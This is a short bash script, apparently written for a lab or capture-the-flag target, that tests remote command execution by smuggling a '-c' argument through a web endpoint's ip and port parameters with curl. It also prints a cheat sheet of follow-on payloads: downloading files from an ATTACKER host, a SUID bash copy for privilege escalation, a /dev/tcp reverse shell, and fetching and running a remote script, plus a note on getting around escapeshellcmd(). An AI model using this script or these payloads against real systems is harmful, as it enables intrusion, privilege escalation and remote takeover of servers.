#!/bin/bash
# rce-inject.sh - Test RCE via parameter injection in shell commands
# Usage: ./rce-inject.sh <target_base> <rce_endpoint> <param1> <param2>
# Example: ./rce-inject.sh http://10.129.234.87 "index.php?expertmode=tcp" ip port

TARGET="$1"
ENDPOINT="$2"
PARAM1="${3:-ip}"
PARAM2="${4:-port}"

if [ -z "$TARGET" ] || [ -z "$ENDPOINT" ]; then
    echo "Usage: rce-inject.sh <target_base> <endpoint_with_params> [param1] [param2]"
    echo "Example: ./rce-inject.sh http://10.129.234.87 'index.php?expertmode=tcp' ip port"
    exit 1
fi

# Test blind RCE
echo "=== RCE Injection Test ==="
echo "Target: $TARGET/$ENDPOINT"

PAYLOAD='127.0.0.1 22 -c "touch /tmp/rce_test"'
echo "[1] Testing -c injection..."
curl -s "$TARGET/$ENDPOINT" -d "$PARAM1=${PAYLOAD%% *}&$PARAM2=${PAYLOAD#* }" 2>&1 | head -c 100

echo ""
echo "[2] Verifying by reading /tmp/rce_test..."
# Read via your existing file read
echo "Manually verify: curl -s -X POST '$TARGET/index.php' -d 'url=http://+file:///tmp/rce_test'"

echo ""
echo "=== Useful RCE commands (-c injection) ==="
echo "  Write file:      -c \"curl http://ATTACKER/file -o /tmp/dest\""
echo "  SUID bash:       -c \"cp /bin/bash /tmp/bash; chmod u+s /tmp/bash\""
echo "  Reverse shell:   -c \"bash -c 'exec bash -i &>/dev/tcp/ATTACKER/PORT <&1'\""
echo "  Fetch script:    -c \"curl http://ATTACKER/script.sh -o /tmp/s.sh; bash /tmp/s.sh\""
echo ""
echo "NOTE: escapeshellcmd() escapes: &#;\`|*?~<>^()[]{}$\\ and \\x0A"
echo "      Use quoted strings for multi-word -c commands"
